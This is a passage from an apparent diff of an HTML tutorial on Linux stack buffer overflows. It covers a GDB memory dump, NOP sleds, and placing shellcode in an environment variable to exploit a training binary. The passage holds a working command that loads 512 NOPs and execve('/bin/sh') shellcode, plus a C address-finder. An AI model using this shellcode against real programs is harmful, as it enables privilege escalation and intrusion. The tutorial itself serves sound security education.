+0xbffff480:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff490:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff4a0:    0x42424242    0x42424242    0x42424242    0xbffff460
+0xbffff4b0:    0x00000000    0xbffff554    0xbffff560    0xb7fe0860
+0xbffff4c0:    0xb7ff6821    0xffffffff    0xb7ffeff4    0x0804826d
+0xbffff4d0:    0x00000001    0xbffff510    0xb7fefc16    0xb7fffac0
+0xbffff4e0:    0xb7fe0b58    0xb7fbeff4    0x00000000    0x00000000
+(gdb) continue
+Continuing.
+process 8698 is executing new program: /bin/dash
+#
+</code></pre><p>Yes! We have spawned a shell (the # means we have spawned a shell. We can now execute shell commands). So now all we need to do is to execute it in the real non-GDB environment and it should work right? Wrong.</p>
+<p><img src="sigill.png" alt="" title="Figure 7: Shellcode failing in real environment"></p>
+<p>Why doesn&#39;t it work in the real Linux environment? It worked perfectly in GDB. The reason is because GDB&#39;s environment is slightly different from the real one. What works in GDB might not work in the actual environment because of slight variations. However, we can counter this and get the shell to work in the real environment as well.</p>
+<h3 id="nop-sled-to-the-rescue">NOP-sled to the Rescue</h3>
+<p>There is one foundational assembly instruction that I have not yet taught you. I&#39;ve saved it for this. In assembly, there is an instruction called NOP. NOP does absolutely nothing. It takes up space in the memory but the processor essentially skips it. It even means no operation because literally, there is no operation that this instruction tells the processor to perform. NOP can be represented using the hex character &quot;\x90&quot;. How NOP-sled rescue us in the case of overflows and shellcodes? Since the real operating environment differs from the GDB environment, we need a way to make sure that the entire shellcode is execute and no illegal instructions are executed. To do this, we will put our shellcode in between NOPs and Bs. Let&#39;s look at the format.</p>
+<pre><code>Lower Memory Address
+
+(NOPs)
+(Shellcode)
+(Bs)
+(Overwritten return address)
+
+Higher Memory Address
+</code></pre><p>What is so good about using NOPs? If we use a NOP-sled, we no longer need to point the return address to the exact location of the shellcode. We simply point it to the middle of the NOP-sled located higher in the stack. This will make sure that the ENTIRE shellcode is executed properly and that no memory violations will occur. However, we only have 76 bytes to mess with. That&#39;s not enough. If we had over 100, we could probably use the buffer itself. In this case, we need another way to put more NOPs into the memory before the shellcode. To do this, we can load the shellcode and NOPs into an environmental variable.</p>
+<pre><code>export shell=$(python -c &#39;print &quot;\x90&quot;*512 + &quot;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot;&#39;)
+</code></pre><p>I&#39;ve added 512 bytes before the shellcode so we can adjust the return address later. We need a way to find the memory of the variable. This simple C program will help us.</p>
+<pre><code class="lang-c"><span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;stdlib.h&gt;</span>
+
+<span class="hljs-keyword">int</span> main()
+{
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%p\n"</span>, getenv(<span class="hljs-string">"shell"</span>));
+}
+</code></pre>
+<p>To construct our final overflow attack, we need to add shell to the environmental variables (memory). Then, we will run our shell program to find the memory address of shell. Finally, we will run ex6 with 76 Bs and a return address that matches the one outputted by our shell program. If errors occur, we will adjust the value of the return address to higher memory addresses until it works.</p>
+<p><img src="finalover.png" alt="" title="Figure 8: Constructing and performing the final attack on ex6"></p>
+<p>Notice that we had to adjust the return address to a value in the middle of the NOP-sled to get a shell.</p>
+<h3 id="i-dislike-math">I Dislike Math</h3>
+<p>If you&#39;re reading this, you probably like math enough to not die from reading all of that. However, if you&#39;re lazy and you just don&#39;t want to do math, you can simply load the shellcode into the memory and overflow everything with the return address. The program will do whatever it does and eventually get to the return address.</p>
+<p><img src="lazy.png" alt="" title="Figure 9: Performing the &quot;lazy&quot; overflow on ex6"></p>
+<p>Magic. Pure magic.</p>
+<h3 id="further-readings-and-references">Further Readings and References</h3>
+<p>&quot;Linux Buffer Overflow&quot; - <a href="http://samsclass.info/123/proj14/lbuf1.htm" target="_blank">http://samsclass.info/123/proj14/lbuf1.htm</a></p>
+<p>&quot;GDB Documentation&quot; - <a href="http://www.gnu.org/software/gdb/documentation/" target="_blank">http://www.gnu.org/software/gdb/documentation/</a></p>
+<p>&quot;Shellcode Database&quot; - <a href="http://shell-storm.org/shellcode/" target="_blank">http://shell-storm.org/shellcode/</a></p>
+<p>Tool: Kali Linux - <a href="http://www.kali.org/downloads/" target="_blank">http://www.kali.org/downloads/</a></p>
+<p>Tool: GDB - <a href="http://www.gnu.org/software/gdb/" target="_blank">http://www.gnu.org/software/gdb/</a></p>
 
                     
                     </section>
